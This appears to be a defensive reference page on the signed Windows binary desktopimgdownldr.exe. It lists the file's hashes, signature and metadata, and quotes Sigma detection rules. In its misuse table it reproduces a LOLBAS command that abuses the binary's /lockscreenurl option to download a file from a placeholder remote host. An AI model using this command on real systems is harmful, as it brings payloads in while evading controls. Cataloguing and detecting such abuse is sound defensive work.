---
title: desktopimgdownldr.exe | desktopimgdownldr.exe
---

# desktopimgdownldr.exe 

* File Path: `C:\windows\system32\desktopimgdownldr.exe`
* Description: desktopimgdownldr.exe

## Hashes

Type | Hash
-- | --
MD5 | `A6DAD18B0AA125535C7FB9BBFDA25266`
SHA1 | `BCDDCFFCA3754875261EF1427EC4F5F4BFB8C2CE`
SHA256 | `0A6A2690C68CF685D8FCC9F3EA78C35BBF6F296B7B33C956B39400DF749DBC78`
SHA384 | `A2A6A2AB35ABE8A3243DAA61F3271D897141DBA8B67DB9EB75C63A0217883C96A127767F48C4F808AECF3C9D356AD767`
SHA512 | `524000008EA887067422943C34489E2F73DA17C194A36B5929C8E5783FF3CCC5FCCFA66F4663A58A8B9EDCC64DFAE1485139D153AEBC67D6FF4C5688B4579439`
SSDEEP | `1536:x1QqAHgKLYb9GoboIdVEVLbIafdXRXnwW4sO0lZTJOd2:xsAlUITE5HVXRXnwW9Ow5JJ`

### Child Processes:
mmc.exe

## Signature

* Status: Signature verified.
* Serial: `3300000266BD1580EFA75CD6D3000000000266`
* Thumbprint: `A4341B9FD50FB9964283220A36A1EF6F6FAA7840`
* Issuer: CN=Microsoft Windows Production PCA 2011, O=Microsoft Corporation, L=Redmond, S=Washington, C=US
* Subject: CN=Microsoft Windows, O=Microsoft Corporation, L=Redmond, S=Washington, C=US

## File Metadata

* Original Filename: desktopimgdownldr.exe
* Product Name: Microsoft Windows Operating System
* Company Name: Microsoft Corporation
* File Version: 10.0.17763.1075 (WinBuild.160101.0800)
* Product Version: 10.0.17763.1075
* Language: English (United States)
* Legal Copyright:  Microsoft Corporation. All rights reserved.


## Possible Misuse

*The following table contains possible examples of `desktopimgdownldr.exe` being misused. While `desktopimgdownldr.exe` is **not** inherently malicious, its legitimate functionality can by abused for malicious purposes.*

Source | Source File | Example | License
-- | -- | -- | --
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_desktopimgdownldr_file.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/file_event/win_susp_desktopimgdownldr_file.yml) | `title: Suspicious Desktopimgdownldr Target File` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_desktopimgdownldr_file.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/file_event/win_susp_desktopimgdownldr_file.yml) | `description: Detects a suspicious Microsoft desktopimgdownldr file creation that stores a file to a suspicious location or contains a file with a suspicious extension` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_copy_system32.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_copy_system32.yml) | `description: Detects a suspicious copy command that copies a system program from System32 to another directory on disk - sometimes used to use LOLBINs like certutil or desktopimgdownldr to a different location with a different name` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_desktopimgdownldr.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_desktopimgdownldr.yml) | `title: Suspicious Desktopimgdownldr Command` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[sigma](https://github.com/Neo23x0/sigma) | [win_susp_desktopimgdownldr.yml](https://github.com/Neo23x0/sigma/blob/master/rules/windows/process_creation/win_susp_desktopimgdownldr.yml) | `description: Detects a suspicious Microsoft desktopimgdownldr execution with parameters used to download files from the Internet` | [DRL 1.0](https://github.com/Neo23x0/sigma/blob/master/LICENSE.Detection.Rules.md)
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Desktopimgdownldr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Desktopimgdownldr.yml) | `Name: Desktopimgdownldr.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Desktopimgdownldr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Desktopimgdownldr.yml) | `  - Command: set "SYSTEMROOT=C:\Windows\Temp" && cmd /c desktopimgdownldr.exe /lockscreenurl:https://domain.com:8080/file.ext /eventName:desktopimgdownldr` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Desktopimgdownldr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Desktopimgdownldr.yml) | `  - Path: c:\windows\system32\desktopimgdownldr.exe` | 
[LOLBAS](https://github.com/LOLBAS-Project/LOLBAS) | [Desktopimgdownldr.yml](https://github.com/LOLBAS-Project/LOLBAS/blob/master/yml/OSBinaries/Desktopimgdownldr.yml) | `  - IOC: desktopimgdownldr.exe that creates non-image file` | 



MIT License. Copyright (c) 2020 Strontic.


